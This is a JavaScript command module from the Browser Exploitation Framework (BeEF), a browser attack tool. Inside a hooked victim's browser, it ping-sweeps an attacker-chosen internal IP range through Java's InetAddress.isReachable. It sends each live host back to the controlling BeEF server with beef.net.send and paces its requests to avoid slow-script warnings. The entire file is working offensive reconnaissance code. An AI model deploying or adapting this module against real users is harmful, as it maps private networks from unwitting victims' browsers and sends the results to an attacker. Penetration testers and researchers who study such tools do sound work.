//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


beef.execute(function() {

    var ips = new Array();
    var ipRange = "<%= @ipRange %>";
    var timeout = "<%= @timeout %>";
    var delay = parseInt(timeout) + parseInt("<%= @delay %>");
    var verbose=false; /* enable for debug */

    // ipRange will be in the form of 192.168.0.1-192.168.0.254: the fourth octet will be iterated.
    // Note: if ipRange is just an IP address like 192.168.0.1, the ips array will contain only one element: ipBounds[0]
    // (only C class IPs are supported atm). Same code as internal_network_fingerprinting module
    var ipBounds = ipRange.split('-');
    var ipToTest;
    if(ipBounds.length>1) {
	    var lowerBound = parseInt(ipBounds[0].split('.')[3]);
        var upperBound = parseInt(ipBounds[1].split('.')[3]);
	
        for(i=lowerBound;i<=upperBound;i++){
        	ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i
           	ips.push(ipToTest);
        }
    } else {
	    ipToTest = ipBounds[0]
	    ips.push(ipToTest);
    }

    if(ips.length==1) verbose=true;

    
    function do_scan(host, timeout) {
	    var status=false;
	    var ping="";

	    try {
		    status = java.net.InetAddress.getByName(host).isReachable(timeout);
	    } catch(e) { /*handle exception...? */ }

	    if (status) {
		    ping = host + " is alive!";
	    } else if(verbose) {
			    ping = host + " is not alive";
		}
	    return ping;
    }


    // call do_scan for each ip
    // use of setInterval trick to avoid slow script warnings
    var i=0;
    if(ips.length>1) {
	    var int_id = setInterval( function() { 
		var host = do_scan(ips[i++],timeout);
		if(host!="") beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host);
		if(i==ips.length) { clearInterval(int_id); beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host=Ping sweep finished'); }
    	}, delay);
    } else {
    	var host = do_scan(ips[i],timeout);
	    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host);
    }

});

